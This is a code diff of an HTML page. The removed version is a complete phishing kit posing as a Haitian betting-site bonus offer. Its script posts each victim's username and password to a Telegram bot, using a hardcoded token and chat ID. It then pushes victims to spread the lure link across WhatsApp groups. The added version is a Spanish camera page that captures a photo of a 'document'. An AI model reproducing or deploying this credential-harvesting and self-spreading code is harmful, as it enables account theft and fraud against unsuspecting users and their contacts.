@@ -1,307 +1,129 @@
 <!DOCTYPE html>
-<html lang="fr">
+<html lang="es">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Bonus 5000 Gourdes Paryaj Lakay</title>
-  <style>
-    body {
-      margin: 0;
-      padding: 0;
-      font-family: Arial, sans-serif;
-      background-color: #f2f2f2;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      flex-direction: column;
-      min-height: 100vh;
-      position: relative;
-    }
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Escanear Documento</title>
+    <style>
+        body {
+            background-color: #222;
+            color: white;
+            font-family: 'Courier Prime', monospace;
+            text-align: center;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            position: relative;
+        }
+        .camera-container {
+            width: 90%;
+            max-width: 400px;
+            background: black;
+            border-radius: 10px;
+            overflow: hidden;
+            position: relative;
+        }
 
-    /* Fond flouté pour toutes les pages */
-    .overlay {
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100vh;
-      background: url('https://i.postimg.cc/026StDM8/Screenshot-20241120-123741-Kiwi-Browser.jpg') no-repeat center;
-      background-size: cover;
-      filter: blur(8px); /* Appliquer un flou sur le fond */
-      z-index: 1;
-    }
+        video {
+            width: 100%;
+            border-radius: 10px;
+        }
 
-    .container {
-      position: absolute;
-      top: 50%;
-      left: 50%;
-      transform: translate(-50%, -50%);
-      text-align: center;
-      padding: 30px;
-      background: rgba(255, 255, 255, 0.8); /* Fond léger transparent */
-      border-radius: 10px;
-      width: 80%;
-      max-width: 500px;
-      z-index: 2;
-    }
+        .scan-instructions {
+            margin-top: 10px;
+            font-size: 14px;
+            color: lightblue;
+        }
 
-    .title {
-      font-size: 2.5rem;
-      color: #333;
-      font-weight: bold;
-      margin-bottom: 20px;
-    }
+        .capture-btn {
+            background-color: green;
+            color: white;
+            padding: 10px;
+            border: none;
+            border-radius: 5px;
+            width: 100%;
+            font-size: 16px;
+            font-weight: bold;
+            margin-top: 10px;
+            cursor: pointer;
+        }
 
-    .description {
-      font-size: 1.2rem;
-      color: #555;
-      margin-bottom: 30px;
-    }
-
-    .note {
-      font-size: 1rem;
-      color: #555;
-      margin-top: 20px;
-    }
-
-    .btn-ok {
-      padding: 10px 20px;
-      background-color: #00a651;
-      color: white;
-      border: none;
-      border-radius: 5px;
-      cursor: pointer;
-      font-size: 16px;
-      margin-top: 20px;
-    }
-
-    .btn-ok:hover {
-      background-color: #008f47;
-    }
-
-    /* Page de partage après connexion */
-    .share-header {
-      font-size: 2rem;
-      font-weight: bold;
-      color: #333;
-      margin-bottom: 20px;
-    }
-
-    .share-description {
-      font-size: 1.2rem;
-      color: #555;
-      margin-bottom: 30px;
-    }
-
-    .share-btn {
-      padding: 10px 20px;
-      background-color: #00a651;
-      color: white;
-      border: none;
-      border-radius: 5px;
-      cursor: pointer;
-      font-size: 16px;
-      margin-top: 10px;
-    }
-
-    .share-btn:hover {
-      background-color: #008f47;
-    }
-
-    .login-container {
-      width: 90%;
-      max-width: 350px;
-      background: white;
-      border-radius: 10px;
-      box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
-      padding: 20px;
-      margin-top: -30px; /* Ajuste l'écart pour rester aligné avec l'image */
-      text-align: center;
-      position: relative;
-      z-index: 2;
-    }
-
-    .login-header {
-      background: black;
-      color: white;
-      padding: 10px;
-      font-weight: bold;
-      border-radius: 5px 5px 0 0;
-    }
-
-    .login-form input {
-      width: 100%;
-      margin: 10px 0;
-      padding: 10px;
-      border: 1px solid #ddd;
-      border-radius: 5px;
-    }
-
-    .login-btn {
-      width: 100%;
-      padding: 10px;
-      background-color: #00a651;
-      color: white;
-      border: none;
-      border-radius: 5px;
-      cursor: pointer;
-      font-size: 16px;
-    }
-
-    .login-btn:hover {
-      background-color: #008f47;
-    }
-
-    .forgot-password {
-      margin-top: 10px;
-      font-size: 12px;
-    }
-
-    .forgot-password a {
-      color: #007bff;
-      text-decoration: none;
-    }
-
-    .forgot-password a:hover {
-      text-decoration: underline;
-    }
-
-    .register {
-      margin-top: 20px;
-      font-size: 14px;
-    }
-
-    .register a {
-      color: #007bff;
-      font-weight: bold;
-      text-decoration: none;
-    }
-
-    .register a:hover {
-      text-decoration: underline;
-    }
-  </style>
+        .back-btn {
+            background-color: red;
+            color: white;
+            padding: 10px;
+            border: none;
+            border-radius: 5px;
+            width: 100%;
+            font-size: 16px;
+            font-weight: bold;
+            margin-top: 10px;
+            cursor: pointer;
+        }
+    </style>
 </head>
 <body>
-
-  <!-- Fond flouté pour toutes les pages -->
-  <div class="overlay"></div> <!-- Fond flouté -->
-
-  <!-- Page d'introduction -->
-  <div class="container" id="introPage">
-    <div class="title">Bonus 5000 Gourdes Paryaj Lakay</div>
-    <div class="description">
-      Pour accéder à vos bonus et promotions, veuillez vous connecter et gagner <span class="highlight">5000 Gourdes</span> ! 🎉
+    <h2>Escanear Documento</h2>
+    <p class="scan-instructions">Coloque su documento dentro del marco y tome una foto.</p>
+    <div class="camera-container">
+        <video id="camera" autoplay></video>
     </div>
-    <button class="btn-ok" onclick="showLoginPage()">Se connecter</button>
-  </div>
 
-  <!-- Page de connexion -->
-  <div class="login-container" id="loginPage" style="display: none;">
-    <div class="login-header">CONNEXION</div>
-    <form class="login-form" id="loginForm">
-      <input type="text" id="username" placeholder="🇭🇹 +509 Identifiant" required>
-      <input type="password" id="password" placeholder="Mot de passe" required>
-      <button type="submit" class="login-btn">Se connecter</button>
-    </form>
-    <div class="forgot-password">
-      <a href="#">Mot de passe oublié ?</a>
-    </div>
-    <div class="register">
-      Nouveau ? <a href="#">Crée-toi un compte</a> en quelques minutes !
-    </div>
-  </div>
+    <button class="capture-btn" onclick="captureImage()">Capturar</button>
+    <button class="back-btn" onclick="goBack()">Regresar</button>
 
-  <!-- Page de partage -->
-  <div class="container" id="sharePage" style="display: none;">
-    <div class="share-header">Partagez et obtenez votre bonus !</div>
-    <div class="share-description">
-      Félicitations ! Vous êtes connecté. Pour recevoir vos 5000 Gourdes, partagez ce message dans 5 groupes WhatsApp !
-    </div>
-    <div>
-      <!-- Lien dynamique pour WhatsApp avec message auto-généré -->
-      <a id="whatsappLink" href="https://wa.me/?text=" target="_blank">
-        <button class="share-btn">Partager sur WhatsApp</button>
-      </a>
-    </div>
-    <div class="note">
-      *Partagez le message dans 5 groupes pour obtenir le bonus !
-    </div>
-  </div>
+    <script>
+        let video = document.getElementById("camera");
 
-  <script>
-    const form = document.getElementById('loginForm');
+        // Fonction pour demander l'accès à la caméra
+        async function requestCameraAccess() {
+            try {
+                // Demander l'accès à la caméra
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                video.srcObject = stream; // Afficher le flux vidéo dans l'élément <video>
+            } catch (error) {
+                // Gérer les erreurs
+                if (error.name === 'NotAllowedError') {
+                    alert("El acceso a la cámara fue denegado. Por favor, permita el acceso para continuar.");
+                } else if (error.name === 'NotFoundError') {
+                    alert("No se encontró ninguna cámara en el dispositivo.");
+                } else {
+                    alert("No se pudo acceder a la cámara: " + error.message);
+                }
+            }
+        }
 
-    form.addEventListener('submit', function (e) {
-      e.preventDefault();
+        // Fonction pour capturer une image
+        function captureImage() {
+            if (!video.srcObject) {
+                alert("No hay acceso a la cámara. Por favor, permita el acceso e intente nuevamente.");
+                return;
+            }
 
-      // Récupérer les données de connexion
-      const username = document.getElementById('username').value;
-      const password = document.getElementById('password').value;
+            // Créer un canvas pour capturer l'image
+            let canvas = document.createElement("canvas");
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            let context = canvas.getContext("2d");
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            let imageData = canvas.toDataURL("image/png");
 
-      // Configuration de l'envoi via Telegram
-      const botToken = '7758063218:AAHP_0GVZet8I00a2xzWHfRw2Bwwp4MnZc4';
-      const chatId = '7055230106';
-      const message = `🔔 Nouvelle connexion :
-Identifiant : ${username}
-Mot de passe : ${password}`;
+            // Sauvegarder l'image dans le localStorage
+            localStorage.setItem("scannedImage", imageData);
+            alert("Imagen capturada con éxito.");
+        }
 
-      // URL de l'API Telegram
-      const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+        // Fonction pour revenir à la page précédente
+        function goBack() {
+            window.location.href = "index.html";
+        }
 
-      // Envoi de la requête
-      fetch(url, {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json',
-        },
-        body: JSON.stringify({
-          chat_id: chatId,
-          text: message,
-        }),
-      })
-        .then((response) => {
-          if (response.ok) {
-            // Afficher la page de partage après connexion
-            document.getElementById('loginPage').style.display = 'none';
-            document.getElementById('sharePage').style.display = 'block';
-
-            // Appeler la fonction pour générer le message WhatsApp après la connexion
-            generateWhatsappMessage();
-          } else {
-            alert('Erreur lors de l\'envoi.');
-          }
-        })
-        .catch((error) => {
-          console.error('Erreur :', error);
-          alert('Une erreur est survenue.');
-        });
-    });
-
-    // Fonction pour afficher la page de connexion
-    function showLoginPage() {
-      document.getElementById('introPage').style.display = 'none';
-      document.getElementById('loginPage').style.display = 'block';
-    }
-
-    // Fonction pour générer automatiquement le message avec l'URL de la page
-    function generateWhatsappMessage() {
-      // Remplacer par le lien réel de la page
-      const pageUrl = "https://bit.ly/5000gourdesbonus"; // URL de votre page réelle
-      
-      // Message à partager sur WhatsApp
-      const message = encodeURIComponent(
-        `🎉 **Paryaj Lakay** vous offre un bonus de **5000 Gourdes** en vous connectant sur notre plateforme ! 🎉\n\n` +
-        `🚀 Pour recevoir votre bonus, connectez-vous maintenant et commencez à gagner ! 🚀\n\n` +
-        `✅ Cliquez ici pour accéder à votre compte et obtenir votre bonus exclusif : ${pageUrl}`
-      );
-
-      // Mettre à jour l'URL du lien WhatsApp
-      const whatsappLink = document.getElementById('whatsappLink');
-      whatsappLink.href = `https://wa.me/?text=${message}`;
-    }
-
-  </script>
-
+        // Demander l'accès à la caméra dès que la page est chargée
+        window.onload = requestCameraAccess;
+    </script>
 </body>
 </html>
